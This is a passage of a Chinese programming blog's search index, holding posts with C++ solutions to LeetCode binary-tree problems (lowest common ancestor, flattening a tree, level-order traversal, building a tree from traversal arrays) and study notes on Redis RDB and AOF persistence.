<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>leetcode236复习二叉树的祖先节点</title>
    <link href="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/"/>
    <url>/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>祖先节点QAQ</p><span id="more"></span><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>首先，题目是要找二叉树的最近公共祖先，给出的定义是：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p><p><img src="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/Snipaste_2024-06-14_21-33-06.png"></p><h3 id="祖先节点"><a href="#祖先节点" class="headerlink" title="祖先节点"></a>祖先节点</h3><p>一个节点的祖先我简单理解为，这个节点向上回溯过程中遇到的所有节点，直到根节点为止。</p><p>两个节点的公共祖先节点我简单理解为，这两个节点回溯路径中重合的节点，直到根节点为止。</p><p>最近的公共祖先节点我简单理解为，重合节点中高度最小（深度最大）的节点。在判断中，可以认为一个公共祖先节点的左右子节点均不再是公共祖先节点，那么这个节点就是最近的公共祖先节点。</p><p>解题：</p><p>对于二叉树类的题目，一般就采用递归遍历的方式，这道题选择DFS，当我们遇到需要寻找的节点时，就返回这个节点，然后向下遍历左子树和右子树，得到遍历结果left和right。</p><p>此时left无非三种结果：null,p,q；同理right也是。</p><ul><li>当两者皆为空时，说明不存在，返回空即可</li><li>当left为空时，说明p或q某一个在当前root节点右侧，且可以保证当p和q在同一侧时，返回的总是p、q中深度小的那个，反之right为空同理</li><li>当两者均不为空时，因为是回溯的，所以第一次运行到最后的<code>return root</code>，说明当前的root节点是最近公共祖先节点</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span> || root == p || root == q)<br>        &#123;<br>            <span class="hljs-keyword">return</span> root;<br>        &#125;<br>        TreeNode *left = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);<br>        TreeNode *right = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);<br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> right;<br>        <span class="hljs-keyword">if</span> (right == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> left;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode114认识二叉树的前驱节点</title>
    <link href="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/"/>
    <url>/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你二叉树的根结点 <code>root</code> ，请你将它展开为一个单链表：</p><ul><li>展开后的单链表应该同样使用 <code>TreeNode</code> ，其中 <code>right</code> 子指针指向链表中下一个结点，而左子指针始终为 <code>null</code> 。</li><li>展开后的单链表应该与二叉树 <a href="https://baike.baidu.com/item/%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86/6442839?fr=aladdin"><strong>先序遍历</strong></a> 顺序相同。</li></ul><p>这道题一开始做的时候开了一个数组存了前序遍历的结果，然后对数组操作解题。做是做出来了，但感觉中等题应该有比较巧妙的思路解题。于是去看了题解，学习到了前驱节点这个概念。</p><h3 id="前驱与后继"><a href="#前驱与后继" class="headerlink" title="前驱与后继"></a>前驱与后继</h3><p><strong>一个节点的前驱节点，也就是中序遍历中该节点的前一个节点。</strong>举个例子：</p><p><img src="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/Snipaste_2024-06-06_16-42-24.png"></p><p>中序遍历的顺序为：1，2，4，5，7，8，9，11</p><p>那么7的前驱节点为5，8的前驱节点为7</p><p>分析一下就可以看出，5其实是7的左子树的最右下的节点，也是中序遍历左子的最后一个节点</p><p><strong>一个节点的后继节点，也就是中序遍历中该节点的后一个节点</strong></p><p>那么7的后继节点为8，8的后继节点为9</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>学习到了前驱节点，再看这道题，可以发现，要按照前序遍历的结果形成链表，就是要把<strong>访问到的当前节点的右子树接到当前节点的前驱节点上</strong>。</p><p><img src="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/Snipaste_2024-06-06_16-53-05.png"></p><p>那我做题的思路可以转变到：遍历节点，判断该节点的左子节点<code>lnode</code>是否存在，如果存在，取出这个左子树的最右下的节点，这个节点就是当前节点的前驱节点<code>pnode</code>，然后将当前遍历节点的右子节点<code>rnode</code>接到<code>pnode</code>上。做完上面的操作后，将该节点的右子树指针赋值为左子树指针，并将左子树指针置空。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">flatten</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        TreeNode *current = root;<br>        <span class="hljs-keyword">while</span>(current!=<span class="hljs-literal">nullptr</span>)<br>        &#123;<br>            <span class="hljs-comment">// 判断左子树是否为空</span><br>            <span class="hljs-keyword">if</span> (current-&gt;left!=<span class="hljs-literal">nullptr</span>)<br>            &#123;<br>                TreeNode *lnode = current-&gt;left;<br>                <span class="hljs-comment">// 前驱节点</span><br>                TreeNode *pnode = lnode;<br>                <span class="hljs-keyword">while</span>(pnode-&gt;right!=<span class="hljs-literal">nullptr</span>) pnode = pnode-&gt;right;<br>                pnode-&gt;right = current-&gt;right;<br>                current-&gt;right = lnode;<br>                current-&gt;left  = <span class="hljs-literal">nullptr</span>;<br>            &#125;<br>            current = current-&gt;right;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis学习</title>
    <link href="/2024/06/05/Redis%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/06/05/Redis%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>之前写的项目里用过redis，但是没有专门学习过，现在系统学习一下。</p><span id="more"></span><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>redis是典型的非关系型数据库。以key-value形式存储。</p><p>NoSQL也有说法“Not Only SQL”。</p><p>优点：<strong>对数据高并发读写（内存操作）</strong>、<strong>单线程操作（原子性）</strong></p><p><strong>Redis为什么不用多线程？</strong></p><p>Redis并没有采用多线程的方式来提高性能，而是采用了<strong>单线程+异步IO</strong>模型</p><ol><li>单线程模型避免了多线程的上下文切换开销</li><li>多线程需要增加锁机制，增加系统的复杂性和开销，和redis的设计理念不符</li><li>Redis使用事件驱动模型，在单个线程中通过IO多路复用技术同时监听多个IO事件，并在事件发生时进行处理</li></ol><p><strong>场景设计：热点事件，某个网页点击量短时间内飙升</strong></p><p>将数据缓存在redis中，前端访问时，直接从内存中查数据；等到请求量下降时，再将点击量等等数据同步到关系型数据库中。保持数据的最终一致性即可。</p><h2 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h2><p>事务相当于执行批量的redis操作命令，事务的操作不是原子性的，当中间的操作出错时，不会停止执行命令，也不会回滚到出错前的状态。</p><h2 id="Redis持久化机制"><a href="#Redis持久化机制" class="headerlink" title="Redis持久化机制"></a>Redis持久化机制</h2><p>Redis不定时的将数据持久到硬盘中，Redis启动时，会提前将硬盘中的数据加载到内存。</p><h3 id="RDB方式"><a href="#RDB方式" class="headerlink" title="RDB方式"></a>RDB方式</h3><p>快照方式，将内存数据以快照方式写入到二进制文件中(dump.rdb)。触发RDB持久化过程分为手动触发和自动触发。</p><p>触发机制：</p><h4 id="手动触发："><a href="#手动触发：" class="headerlink" title="手动触发："></a>手动触发：</h4><ol><li>save命令：<strong>会阻塞当前Redis服务器，无法接收其他请求</strong>，如果内存中数据较多，会造成长时间的阻塞，不建议在生产环境中使用</li><li>bgsave命令：<strong>异步操作，不会阻塞主进程</strong>。redis执行fork指令开启一个子进程，由子进程实现RDB持久化。</li></ol><p><strong>bgsave命令就一定不会阻塞主进程吗？</strong></p><p>不一定，bgsave命令中，fork子进程这个操作是同步的，如果fork一个子进程花费时间太久（一般很快），basave命令仍然有阻塞其他客户的请求的可能。</p><h4 id="自动触发："><a href="#自动触发：" class="headerlink" title="自动触发："></a>自动触发：</h4><p>使用save相关配置：save m n，表示m秒内数据集存在n次修改时会自动触发bgsave命令。</p><ul><li>优点：压缩紧凑的二进制文件，使用于备份、全量复制等场景。开发中可以按照每6小时执行一次bgsave备份。</li><li>缺点：RDB无法做到实时持久化，每次bgsave时都需要fork子进程，消耗时间</li></ul><h3 id="AOF方式"><a href="#AOF方式" class="headerlink" title="AOF方式"></a>AOF方式</h3><p><code>AOF(Append-only file)</code></p><p>与RDB存储某个时刻的快照不同，AOF持久化方式会记录客户端对服务器的每一次写操作命令，并将这些写操作以Redis协议追加保存到以后缀为aof文件末尾，在Redis服务器重启时，会加载并运行aof文件的命令，以达到恢复数据的目的。</p><p>Redis默认不开启AOF持久化方式，我们可以在配置文件中开启并进行更加详细的配置，如下面的redis.conf文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开启aof机制</span><br>appendonly <span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># aof文件名</span><br>appendfilename <span class="hljs-string">&quot;appendonly.aof&quot;</span><br><br><span class="hljs-comment"># 写入策略,always表示每个写操作都保存到aof文件中,也可以是everysec或no</span><br>appendfsync always<br><br><span class="hljs-comment"># 默认不重写aof文件</span><br>no-appendfsync-on-rewrite no<br><br><span class="hljs-comment"># 保存目录</span><br><span class="hljs-built_in">dir</span> ~/redis/<br></code></pre></td></tr></table></figure><h4 id="三种写入策略"><a href="#三种写入策略" class="headerlink" title="三种写入策略"></a>三种写入策略</h4><ol><li>always：保存每一个写操作，很安全也很慢，因为写文件需要进行IO操作</li><li>everysec：默认写入策略，每秒写入一次AOF文件，所以最多刚要写入就宕机，最多丢失1s数据</li><li>no：交给OS来处理，最快，最不安全。</li></ol><h4 id="AOF文件重写"><a href="#AOF文件重写" class="headerlink" title="AOF文件重写"></a>AOF文件重写</h4><p>AOF将客户端的每一个写操作都追加到aof文件末尾，比如对一个key多次执行incr命令，这时候，aof保存每一次命令到aof文件中，aof文件会变得非常大。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">incr num 1<br>incr num 2<br>incr num 3<br>incr num 4<br>incr num 5<br>incr num 6<br>...<br>incr num 100000<br></code></pre></td></tr></table></figure><p>aof文件太大，加载aof文件恢复数据时，就会非常慢，为了解决这个问题，Redis支持aof文件重写，通过重写aof，可以生成一个恢复当前数据的最少命令集，比如上面的例子中那么多条命令，可以重写为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> num <span class="hljs-number">100000</span><br></code></pre></td></tr></table></figure><p>aof文件是一个二进制文件，并不是像上面的例子一样，直接保存每个命令，而使用Redis自己的格式，上面只是方便演示。</p><p><strong>AOF重写方式也是异步操作，即如果要写入aof文件，则Redis主进程会forks一个子进程来处理</strong></p><h4 id="重写AOF文件的好处"><a href="#重写AOF文件的好处" class="headerlink" title="重写AOF文件的好处"></a>重写AOF文件的好处</h4><ul><li>压缩aof文件，减少磁盘占用量。</li><li>将aof的命令压缩为最小命令集，加快了数据恢复的速度。</li></ul><h3 id="混合持久化"><a href="#混合持久化" class="headerlink" title="混合持久化"></a>混合持久化</h3><p>混合持久化是Redis 4.0之后新增的方式，结合了RDB和AOF的优点。</p><ul><li>在写入的时候，先把当前数据以RDB形式写入文件的开头，再将后续的操作命令以AOF的格式存入文件。这样既能保证Redis重启时的速度，又能降低数据丢失的风险。</li><li>混合持久化的缺点是，在Redis重启时需要同时处理两个文件（RDB文件和AOF文件），可能会比单一持久化机制的恢复速度慢。</li></ul><p>混合模式兼并了RDB重启后的快速恢复能力和AOF丢失数据风险低的能力，具体操作流程如下：</p><ol><li>子进程会通过<code>BGSAVE </code>写入AOF中</li><li>触发<code>BGREWRITEAOF</code>后，会将AOF写入到文件</li><li>将含有RDB和AOF的数据覆盖旧的AOF文件（这时AOF文件一半为RDB，一半为AOF）</li></ol><h4 id="AOF重写和RDB持久化的冲突"><a href="#AOF重写和RDB持久化的冲突" class="headerlink" title="AOF重写和RDB持久化的冲突"></a>AOF重写和RDB持久化的冲突</h4><p>在Redis中，AOF重写和RDB持久化可能会同时发生，这会导致一些冲突和问题。例如：</p><ul><li>AOF重写和RDB持久化都需要fork子进程，如果两个子进程同时存在，会增加内存的消耗和系统的负载。</li><li>AOF重写和RDB持久化都需要写入磁盘，如果两个文件同时写入，会增加磁盘的压力和IO的开销。</li><li>AOF重写和RDB持久化都需要在完成后通知主进程，如果两个信号同时到达，可能会造成信号丢失或者处理错误。</li></ul><p>为了解决这些冲突和问题，Redis采用了以下策略：</p><ul><li><strong>如果AOF重写和RDB持久化同时被触发，那么只有一个子进程会被创建，优先执行RDB持久化，然后再执行AOF重写。</strong>这样可以避免同时存在两个子进程的情况。</li><li>如果AOF重写正在进行，而此时又收到了RDB持久化的请求，那么RDB持久化会被延迟到AOF重写完成后再执行。这样可以避免同时写入两个文件的情况。</li><li>如果AOF重写和RDB持久化都完成了，那么主进程会先处理RDB持久化的信号，然后再处理AOF重写的信号。这样可以避免信号丢失或者处理错误的情况。</li></ul><p>总之，Redis通过优先级、延迟和顺序等方式来协调AOF重写和RDB持久化的冲突和问题，保证了数据的完整性和一致性，下图为简要说明。</p><table><thead><tr><th>场景</th><th>策略</th></tr></thead><tbody><tr><td>AOF重写与RDB持久化同时被触发</td><td>优先RDB</td></tr><tr><td>AOF重写正在进行</td><td>优先AOF</td></tr><tr><td>AOF重写和RDB持久化都完成</td><td>优先RDB</td></tr></tbody></table><h3 id="三种模式的选择建议"><a href="#三种模式的选择建议" class="headerlink" title="三种模式的选择建议"></a>三种模式的选择建议</h3><p>具体的选择建议如下：</p><ul><li>如果对数据完整性要求不高，可以只使用RDB，或者将AOF的同步频率设置为每秒一次</li><li>如果想让数据尽可能不丢失，可以只使用AOF，并将AOF的同步频率设置为每次写入操作都同步</li><li>如果对数据完整性和性能都有要求，可以同时使用AOF和RDB，并将AOF的同步频率设置为每秒一次。这样既可以保证数据的安全性，又可以利用RDB进行快速的数据恢复</li><li>如果既想节省磁盘空间，又想提高数据恢复速度，可以只使用RDB，并适当调整RDB的快照频率</li></ul><h2 id="Redis内存淘汰机制"><a href="#Redis内存淘汰机制" class="headerlink" title="Redis内存淘汰机制"></a>Redis内存淘汰机制</h2>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后端开发</tag>
      
      <tag>Redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode117复习二叉树的层序遍历</title>
    <link href="/2024/06/05/leetcode117%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"/>
    <url>/2024/06/05/leetcode117%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<p>刷到了leetcode117，通过层序遍历做出来的，顺便就复习一下二叉树的层序遍历。</p><span id="more"></span><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/">题目链接</a></p><p>根据题意，我们需要将每个节点的<code>next</code>指针指向在树中这个节点右边的那个节点，所以很显然，这道题是层序遍历节点，在某一层中，才能找到树中某个节点的右边节点。</p><p>可以写出如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">// Definition for a Node.</span><br><span class="hljs-comment">class Node &#123;</span><br><span class="hljs-comment">public:</span><br><span class="hljs-comment">    int val;</span><br><span class="hljs-comment">    Node* left;</span><br><span class="hljs-comment">    Node* right;</span><br><span class="hljs-comment">    Node* next;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span><br><span class="hljs-comment">        : val(_val), left(_left), right(_right), next(_next) &#123;&#125;</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">connect</span><span class="hljs-params">(Node* root)</span> </span>&#123;<br>        queue&lt;Node*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>)<br>            que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-comment">// 层序遍历</span><br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i)<br>            &#123;<br>                Node* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> ( i == size - <span class="hljs-number">1</span>)<span class="hljs-comment">//该层最后一个节点</span><br>                &#123;<br>                    node-&gt;next=<span class="hljs-literal">NULL</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">// 将next指针指向右边的节点</span><br>                    node-&gt;next = que.<span class="hljs-built_in">front</span>();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (node-&gt;left!=<span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right!=<span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="记录一下二叉树层序遍历的板子"><a href="#记录一下二叉树层序遍历的板子" class="headerlink" title="记录一下二叉树层序遍历的板子"></a>记录一下二叉树层序遍历的板子</h3><p>二叉树的层序遍历通过队列实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">solution</span><span class="hljs-params">(Node* root)</span> </span>&#123;<br>        queue&lt;Node*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>)<br>            que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-comment">// 存放层序遍历结果</span><br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-comment">// 层序遍历</span><br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            vector&lt;<span class="hljs-type">int</span>&gt; temp;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i)<br>            &#123;<br>                Node* t = que.<span class="hljs-built_in">front</span>();<br>                <span class="hljs-keyword">if</span> (t-&gt;left) que.<span class="hljs-built_in">push</span>(t-&gt;left);<br>                <span class="hljs-keyword">if</span> (t-&gt;right) que.<span class="hljs-built_in">push</span>(t-&gt;right);<br>                que.<span class="hljs-built_in">pop</span>();<br>                temp.<span class="hljs-built_in">push_back</span>(t);<br>            &#125;<br>            result.<span class="hljs-built_in">push_back</span>(temp);<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过数组构造树</title>
    <link href="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/"/>
    <url>/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>通过前序遍历数组(后序遍历数组)和中序遍历数组构造树的方法😀</p><span id="more"></span><h3 id="前序遍历-中序遍历构造"><a href="#前序遍历-中序遍历构造" class="headerlink" title="前序遍历+中序遍历构造"></a>前序遍历+中序遍历构造</h3><p>本题为leetcode-105</p><p>在前序遍历中，我们可以知道顺序为：中、左、右</p><p>在中序遍历中，我们可以知道顺序为：左、中、右</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">preorder = [<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>];<br>inorder = [<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>如上两个数组，我们可以发现前序数组的第一个元素3就是根节点的数据，那么根据这个根节点的数据，我们可以在中序数组中分割出两个子数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorderLeft = [<span class="hljs-number">9</span>];<br>inorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>接着，我们发现在前序数组中，不能直接分割出后面的左右两部分，需要借助分割出的中序数组来帮助我们分割前序数组，即通过新的两个中序数组的大小，我们可以在前序数组中找出左右子树的区间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">preorderLeft = [<span class="hljs-number">9</span>];<br>preorderRight = [<span class="hljs-number">20</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>然后递归左子树和右子树即可。</p><p>完整代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, 